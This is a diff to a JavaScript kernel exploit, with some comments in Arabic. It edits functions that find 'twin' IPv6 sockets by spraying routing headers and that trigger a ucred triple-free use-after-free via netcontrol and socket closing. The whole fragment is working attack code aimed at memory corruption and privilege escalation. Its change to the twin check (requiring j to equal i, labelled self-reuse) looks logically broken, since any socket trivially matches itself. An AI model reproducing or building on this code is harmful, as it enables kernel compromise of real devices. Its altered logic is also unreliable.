@@ -878,16 +878,15 @@ function find_twins_core() {
 
       var condition =
         (val & 0xFFFF0000) === RTHDR_TAG &&
-        i !== j &&
-        j >= 0 &&
-        j < ipv6_socks.length;
+        j === i;
 
       if (condition) {
-        send_notification("\n🔥🔥🔥 [TWINS-FOUND] i=" + i + " j=" + j + " 🔥🔥🔥\n");
+        send_notification("\n[SELF-REUSE] i=" + i + " j=" + j + "\n");
         twins[0] = i;
-        twins[1] = j;
+        twins[1] = i; // self-reuse: نفس السوكت
         return true;
       }
+      
     }
 
     count++;
@@ -900,10 +899,8 @@ function find_twins_core() {
 var real_find_twins = find_twins_core;
 
 function find_twins() {
-  send_notification("[TWINS] START");
   var result = real_find_twins();
   if (!result) {
-    send_notification("[TWINS] RESULT = NOT FOUND");
   }
   return result;
 }
@@ -1418,8 +1415,6 @@ function trigger_ucred_triplefree() {
     write32(sock_buf, dummy_socket);
     send_notification("step 1: sock_buf[0..3] = " + read32(sock_buf));
     netcontrol(-1, 0x20000003, sock_buf, 8);
-    send_notification("step 1: after netcontrol SET_QUEUE");
-    // نقفل الـ dummy → نرشّح الـ file + ucred لـ UAF
     close(dummy_socket);
 
     // 2) allocate new ucred
@@ -1457,7 +1452,6 @@ function trigger_ucred_triplefree() {
 
     if (dup_fd > -1) {
       close(dup_fd);
-      send_notification("step 7: close(dup_fd) done");
     } else {
       send_notification("step 7: dup failed");
     }
@@ -1474,8 +1468,7 @@ function trigger_ucred_triplefree() {
       close(new BigInt(uaf_socket));
       continue;
     }
-
-    send_notification("[TRIGGER] step 8: twins found twins[0]=" + twins[0] + " twins[1]=" + twins[1]);
+    send_notification("[TRIGGER] step 8: twins[0]=" + twins[0] + " twins[1]=" + twins[1]);
 
     // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
